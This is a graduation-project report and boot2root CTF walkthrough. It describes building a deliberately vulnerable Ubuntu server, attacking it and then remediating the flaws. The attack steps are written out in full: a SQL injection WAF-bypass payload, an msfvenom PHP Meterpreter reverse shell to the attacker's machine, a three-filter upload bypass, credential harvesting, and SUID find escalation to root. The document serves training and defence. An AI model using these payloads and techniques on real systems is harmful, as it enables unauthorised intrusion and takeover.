# 🛡️ DEPI Graduation Project — Official Technical Report & Walkthrough

**Project Title:** Engineering & Auditing a Custom Boot2Root Vulnerable Infrastructure  
**Initiative:** Digital Egypt Pioneers Initiative (DEPI) — Cybersecurity & Ethical Hacking Track  
**Target Operating System:** Ubuntu Server 20.04 LTS  
**Attacker Operating System:** Kali Linux  

---

## 📑 Table of Contents
1. [Executive Summary](#1-executive-summary)
2. [Infrastructure & Network Architecture (The 8 Ports)](#2-infrastructure--network-architecture-the-8-ports)
3. [Phase 1: Environment Build & Reverse Hardening (How We Built It)](#3-phase-1-environment-build--reverse-hardening-how-we-built-it)
4. [Phase 2: Black-Box Penetration Testing Walkthrough (Red Team)](#4-phase-2-black-box-penetration-testing-walkthrough-red-team)
5. [Phase 3: Remediation & Security Hardening (Blue Team)](#5-phase-3-remediation--security-hardening-blue-team)

---

## 1. Executive Summary
This graduation project demonstrates the end-to-end lifecycle of offensive and defensive cybersecurity engineering. Instead of relying on pre-built training environments, our team designed and provisioned a custom **Boot2Root Capture The Flag (CTF)** virtual appliance from scratch on **Ubuntu Server 20.04 LTS**.

The infrastructure simulates a realistic corporate server exposing **8 open TCP ports**. Seven of these ports are engineered as hardened **Rabbit Holes (Decoys)** to test the auditor's enumeration discipline, while a single entry point (**Port 8080**) hosts an internal web application protected by custom multi-layer filters. Achieving full system compromise (`root`) requires chaining **Web Application Penetration Testing (SQLi WAF Bypass + 3-Layer Unrestricted File Upload Bypass)**, **Payload Generation (`msfvenom` & `msfconsole`)**, **Lateral Movement via Credential Harvesting**, and **Linux Privilege Escalation (SUID Misconfiguration)**.

---

## 2. Infrastructure & Network Architecture (The 8 Ports)

| Port | Protocol / Service | Role in Assessment | Security & Hardening Mechanics |
| :--- | :--- | :--- | :--- |
| **21/tcp** | FTP (`vsftpd 3.0.5`) | **Decoy #1 (Rabbit Hole)** | Patched daemon; anonymous login restricted to read-only (`write_enable=NO`) inside a `/srv/ftp` chroot jail. |
| **22/tcp** | SSH (`OpenSSH 8.2p1`) | **Decoy #2 (Rabbit Hole)** | `PasswordAuthentication no` enforced in `sshd_config`, neutralizing brute-force tools (`Hydra` / `Medusa`). |
| **80/tcp** | HTTP (`Apache 2.4.41`) | **Decoy #3 (Rabbit Hole)** | Public corporate landing page (`/var/www/html/index.php`) with zero user-input parameters. |
| **139/tcp** | NetBIOS (`Samba smbd`) | **Decoy #4 (Rabbit Hole)** | Patched Samba NetBIOS session service; immune to legacy RCE exploits. |
| **445/tcp** | SMB (`Samba 4.x`) | **Decoy #5 (Rabbit Hole)** | Guest read-only share (`Public_Temp`) isolated in `/srv/samba/public_temp`. |
| **3306/tcp** | MySQL (`MySQL 8.0`) | **Decoy #6 (Rabbit Hole)** | Bound to `0.0.0.0`, but database accounts are strictly bound to `@'localhost'`, dropping external packets (`Error 1130`). |
| **8080/tcp** | HTTP (`Apache VHost`) | **🎯 Real Entry Point** | Hosts `/var/www/portal` containing a custom SQLi Sanitizer and a 3-Layer File Upload validator. |
| **9090/tcp** | HTTP-Alt (`Apache`) | **Decoy #7 (Rabbit Hole)** | Secondary listener serving the static corporate page as a backup decoy port. |

---

## 3. Phase 1: Environment Build & Reverse Hardening (How We Built It)

### 3.1 Base OS & Service Provisioning
We deployed Ubuntu Server 20.04 LTS and installed the required service stack (`apache2`, `php`, `mysql-server`, `vsftpd`, `samba`, `openssh-server`).

### 3.2 Engineering the Database & Custom SQLi Filter (`Port 8080 - index.php`)
To simulate a realistic authentication portal, we created the `depi_portal` database in MySQL and stored the administrator password as an **MD5 Hash** rather than plaintext:
```sql
CREATE DATABASE depi_portal;
CREATE USER 'depi_admin'@'localhost' IDENTIFIED BY 'Pioneer@2026_Pass!';
GRANT ALL PRIVILEGES ON depi_portal.* TO 'depi_admin'@'localhost';
CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(100));
INSERT INTO users (username, password) VALUES ('admin', MD5('SuperComplexPassword_998877!'));
```

In `/var/www/portal/index.php`, we implemented `waf_inspect_and_sanitize()` on both username and password inputs:
* **Filter Level 1:** Blocks SQL comment sequences (`--`) and stacked query semicolons (`;`).
* **Filter Level 2 (Intentional Flaw):** Uses non-recursive `str_ireplace()` to strip `OR`, `AND`, `UNION`, and `SELECT` once, and removes standard spaces (` `).

> 📸 **[SCREENSHOT #1 PLACEHOLDER]:** *Take a screenshot of the MySQL terminal showing `SELECT * FROM depi_portal.users;` to prove that the admin password is stored as an MD5 hash.*  
> `![MySQL Hashed Table](screenshots/01_mysql_hash.png)`

### 3.3 Engineering the 3-Layer File Upload Filter (`Port 8080 - upload.php`)
Access to `upload.php` is restricted via PHP Session verification (`$_SESSION['loggedin'] === true`). Uploaded files are inspected across three sequential gates:
1. **Gate 1 (Extension Blacklist):** Rejects `.php`, `.php3`, `.php4`, `.php7`, `.exe`, and `.sh`. However, Apache is configured with `AddType application/x-httpd-php .php .phtml`, leaving `.phtml` executable.
2. **Gate 2 (MIME Type Verification):** Checks if `$_FILES['file']['type']` matches `image/gif`, `image/jpeg`, or `image/png`.
3. **Gate 3 (Magic Bytes Signature Check):** Reads the first 6 bytes of the binary stream using `fread($fh, 6)` and verifies the presence of `GIF89a` or JPEG magic bytes (`\xFF\xD8\xFF`).

### 3.4 Engineering Lateral Movement & Privilege Escalation
* **Service Isolation:** Apache runs under the restricted `www-data` service account.
* **Lateral Movement (`pioneer`):** We created a standard system developer account (`pioneer`) with the same password used for the local MySQL connection (`Pioneer@2026_Pass!`), demonstrating **CWE-521 (Password Reuse)** and **CWE-798 (Hardcoded Credentials)**.
* **Privilege Escalation (`root`):** We applied the **SUID (Set Owner User ID)** permission bit to `/usr/bin/find` (`chmod u+s /usr/bin/find`), enabling privilege escalation to `euid=0(root)`.

---

## 4. Phase 2: Black-Box Penetration Testing Walkthrough (Red Team)

### Step 1: Network Discovery & Port Enumeration
From the Kali Linux machine, we identify the target IP and run a full port and service scan using `Nmap`:
```bash
sudo arp-scan -l
nmap -sC -sV -p- <TARGET_IP>
```
> 📸 **[SCREENSHOT #2 PLACEHOLDER]:** *Take a screenshot of the Kali terminal showing the `Nmap` scan output with all 8 open ports (`21, 22, 80, 139, 445, 3306, 8080, 9090`).*  
> `![Nmap Scan Results](screenshots/02_nmap_8ports.png)`

---

### Step 2: Investigating the 7 Rabbit Holes (Decoy Elimination)
We systematically test the exposed services to rule out false paths:
```bash
# 1. Testing Port 21 (FTP Anonymous Login)
ftp <TARGET_IP>
# Login as 'anonymous' -> Download hint.txt -> Attempt to upload a file (Fails: Permission Denied)

# 2. Testing Ports 139 & 445 (Samba Guest Share)
smbclient //192.168.115.146/Public_Temp -N
# Read readme.txt -> Points to internal portal on Port 8080

# 3. Testing Port 22 (SSH) & Port 3306 (MySQL)
ssh admin@<TARGET_IP>          # Fails: Permission denied (publickey)
mysql -h <TARGET_IP> -u root   # Fails: ERROR 1130 (Host not allowed to connect)
```
> 📸 **[SCREENSHOT #3 PLACEHOLDER]:** *Take a screenshot showing the FTP `hint.txt` output, the SMB `readme.txt` output, and the MySQL `ERROR 1130` rejection.*  
> `![Testing Decoy Ports](screenshots/03_rabbit_holes.png)`

---

### Step 3: Bypassing the Custom SQL Injection WAF on Port 8080
Navigating to `http://<TARGET_IP>:8080`, we inspect the page source (`Ctrl+U`) and observe the developer note regarding WAF v2.0.

1. **Standard Payload Attempt (Blocked by WAF Level 1):**
   * Input: `admin' OR 1=1 --`
   * Output: `WAF Security Alert: Malicious SQL syntax (-- or ;) blocked!`
2. **Space & Keyword Attempt (Blocked by WAF Level 2):**
   * Input: `admin' OR '1'='1'#`
   * Output: `Authentication Failed` (because `OR` and spaces are stripped).
3. **Crafted WAF Bypass Payload (Success):**
   * Input: `admin'/**/oorr/**/'1'='1'#`
   * **Why it works:** `str_ireplace` removes the inner `or` from `oorr`, leaving a valid `or`. Inline comments `/**/` replace standard spaces, and `#` comments out the MD5 password check.

> 📸 **[SCREENSHOT #4 PLACEHOLDER]:** *Take two screenshots side-by-side: (A) The yellow WAF alert blocking `admin' OR 1=1 --`, and (B) Entering `admin'/**/oorr/**/'1'='1'#` to log in.*  
> `![SQLi WAF Block and Bypass](screenshots/04_sqli_bypass.png)`

---

### Step 4: Payload Generation (`msfvenom`) & 3-Layer File Upload Bypass
Upon authentication, we are redirected to `/upload.php`.

1. **Generating the PHP Meterpreter Payload:**
   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f raw > shell.php
   ```
2. **Testing Filter 1 (Extension Blacklist):**
   * Uploading `shell.php` directly triggers: `Filter 1 Blocked: Direct script extensions (.php, .sh) are forbidden!`
3. **Testing Filter 2 (MIME Type Check):**
   * Renaming `shell.php` to `shell.phtml` bypasses Filter 1, but triggers: `Filter 2 Blocked: Invalid Content-Type (application/octet-stream).`
4. **Bypassing All 3 Filters in Burp Suite Professional:**
   * We intercept the `POST /upload.php` request in **Burp Suite** and modify:
     * `filename="shell.phtml"` (Bypasses Filter 1)
     * `Content-Type: image/gif` (Bypasses Filter 2)
     * Prepend `GIF89a;` at the very beginning of the payload before `/*<?php` (Bypasses Filter 3).

> 📸 **[SCREENSHOT #5 PLACEHOLDER]:** *Take a screenshot of **Burp Suite Repeater/Proxy** showing the modified `filename="shell.phtml"`, `Content-Type: image/gif`, and `GIF89a;` header.*  
> `![Burp Suite Upload Bypass](screenshots/05_burp_upload_bypass.png)`

> 📸 **[SCREENSHOT #6 PLACEHOLDER]:** *Take a screenshot of the browser showing the green message: `File passed all 3 security filters! Stored at: uploads/shell.phtml`.*  
> `![Upload Success](screenshots/06_upload_success.png)`

---

### Step 5: Gaining Initial Foothold via `msfconsole`
We configure the listener in Metasploit and trigger `uploads/shell.phtml` from the browser:
```bash
msfconsole -q
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run
```
> 📸 **[SCREENSHOT #7 PLACEHOLDER]:** *Take a screenshot of `msfconsole` showing `Meterpreter session 1 opened` and the output of `getuid` (`Server username: www-data`).*  
> `![Meterpreter Session Opened](screenshots/07_meterpreter_wwwdata.png)`

---

### Step 6: Post-Exploitation & Lateral Movement (`www-data` -> `pioneer`)
1. **Running Automated Recon (`local_exploit_suggester`):**
   We background the session and run `post/multi/recon/local_exploit_suggester`, confirming that the Linux kernel is patched against known kernel exploits.
2. **Spawning an Interactive TTY Shell & Harvesting Credentials:**
   ```bash
   meterpreter > shell
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ls -la /home
   cat /var/www/portal/index.php | grep mysqli_connect
   ```
   We discover the hardcoded password `Pioneer@2026_Pass!` and switch to the system user `pioneer`:
   ```bash
   su pioneer
   # Password: Pioneer@2026_Pass!
   whoami && id
   cat /home/pioneer/user.txt
   ```
> 📸 **[SCREENSHOT #8 PLACEHOLDER]:** *Take a screenshot of the terminal showing `cat ../index.php`, switching to `su pioneer`, and reading `/home/pioneer/user.txt`.*  
> `![User Flag Captured](screenshots/08_user_flag.png)`

---

### Step 7: Privilege Escalation to `root` (SUID Exploitation)
As user `pioneer`, we enumerate binaries with the SUID bit (`-perm -4000`) owned by `root`:
```bash
find / -perm -4000 -type f 2>/dev/null
```
We identify `/usr/bin/find` in the output. Using its `-exec` flag with `/bin/sh -p` (privileged mode to retain `euid=0`), we escalate to `root`:
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami && id
cat /root/root.txt
```
> 📸 **[SCREENSHOT #9 PLACEHOLDER]:** *Take a screenshot showing the `find / -perm -4000` discovery, executing `/usr/bin/find . -exec /bin/sh -p \; -quit`, running `id` (`euid=0(root)`), and displaying `/root/root.txt`.*  
> `![Root Flag Captured](screenshots/09_root_flag.png)`

---

## 5. Phase 3: Remediation & Security Hardening (Blue Team)

| Vulnerability | Root Cause | Remediated Implementation |
| :--- | :--- | :--- |
| **SQL Injection (`index.php`)** | String concatenation of user input and reliance on non-recursive keyword stripping (`str_ireplace`). | Replaced with **Prepared Statements (`$conn->prepare()`)** and bound parameters (`$stmt->bind_param("s", $username)`). |
| **Weak Password Hashing** | Storing passwords with fast, unsalted `MD5()` hashes. | Upgraded to **Bcrypt** via PHP's native `password_hash($pass, PASSWORD_BCRYPT)` and `password_verify()`. |
| **Unrestricted File Upload (`upload.php`)** | Using an incomplete extension blacklist (`.phtml` missed) and trusting client-side `Content-Type`. | Enforced a strict **Extension Whitelist** (`['jpg', 'png', 'gif']`), server-side `finfo_file()` validation, random UUID renaming, and disabled PHP execution in `/uploads` (`php_admin_flag engine off`). |
| **Lateral Movement (`pioneer`)** | Hardcoded credentials in source code and password reuse across MySQL and Linux OS. | Moved DB credentials to environment variables (`getenv()`) and enforced unique passwords per service. |
| **Privilege Escalation (`root`)** | Unauthorized SUID bit (`4000`) assigned to `/usr/bin/find`. | Revoked SUID bit immediately via `sudo chmod u-s /usr/bin/find`. |
